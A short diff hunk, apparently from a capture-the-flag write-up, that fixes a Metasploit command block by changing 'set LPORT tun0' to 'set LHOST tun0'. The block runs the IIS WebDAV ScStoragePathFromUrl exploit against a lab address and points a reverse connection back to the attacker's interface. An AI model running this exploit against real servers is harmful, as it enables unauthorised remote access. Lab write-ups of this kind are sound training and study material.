@@ -65,7 +65,7 @@ Matching Modules
 
 use exploit/windows/iis/iis_webdav_scstoragepathfromurl
 set RHOSTS 10.10.10.14
-set LPORT tun0
+set LHOST tun0
 run
 ```
 
